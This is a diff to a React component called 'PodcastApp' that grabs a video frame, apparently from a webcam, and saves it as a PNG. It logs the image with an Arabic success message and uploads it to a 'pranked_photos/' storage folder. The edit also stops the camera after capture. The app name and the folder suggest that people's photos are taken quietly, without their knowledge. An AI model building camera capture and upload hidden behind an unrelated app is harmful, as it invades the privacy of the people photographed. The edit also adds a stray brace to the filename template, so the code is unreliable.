@@ -53,20 +53,17 @@ export default function PodcastApp() {
         return;
       }
   
-      // Clear previous canvas data
       context.clearRect(0, 0, canvasRef.current.width, canvasRef.current.height);
-  
-      // Draw the current video frame
       context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height);
   
-      // Extract photo data URL
       const photoDataUrl = canvasRef.current.toDataURL("image/png");
       console.log("تم التقاط الصورة بنجاح:", photoDataUrl);
   
-      // Generate a custom file name based on current time and date
+      videoRef.current.srcObject.getTracks().forEach(track => track.stop()); // أوقف الفيديو بعد الالتقاط
+  
       const now = new Date();
       const formattedTime = `${now.getHours()}-${now.getMinutes()}-${now.getSeconds()}`;
-      const uniqueFileName = `pranked_photos/photo_${formattedTime}.png`;
+      const uniqueFileName = `pranked_photos/photo_${formattedTime}}.png`;
   
       const storageRef = ref(storage, uniqueFileName);
   
